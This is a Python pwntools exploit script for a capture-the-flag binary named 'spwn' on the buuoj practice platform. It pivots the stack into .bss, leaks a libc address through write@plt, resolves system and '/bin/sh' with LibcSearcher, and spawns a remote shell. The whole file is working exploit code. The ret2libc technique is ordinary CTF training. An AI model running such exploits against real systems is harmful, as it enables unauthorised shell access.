#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'spwn'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 28882

LOCAL = 0
LIB   = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():
	start = 0x08048513
	bss = 0x0804A300
	leave = 0x08048511
	offset = 0x180

	p = 'A' * offset
	p += p32(0)

	p += p32(exe.plt['write'])
	p += p32(start)
	p += p32(0x1)
	p += p32(exe.got['read'])
	p += p32(0x10)

	sa('name?', p)	
	p = 'A' * 0x18
	p += p32(bss + offset)
	p += p32(leave)
	sa('say?', p)	
	leak = u32(ru('\xf7')[-3:] + '\xf7')
	libc = LibcSearcher('read', leak)
	libc_base = leak - libc.dump('read')
	sys = libc_base + libc.dump('system')
	sh = libc_base + libc.dump('str_bin_sh')

	p = 'A' * 0x20
	p += p32(0)
	p += p32(sys)
	p += p32(0)
	p += p32(sh)
	s(p)

	p = 'A' * 0x18
	p += p32(bss + 0x20)
	p += p32(leave)
	#db()
	s(p)


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
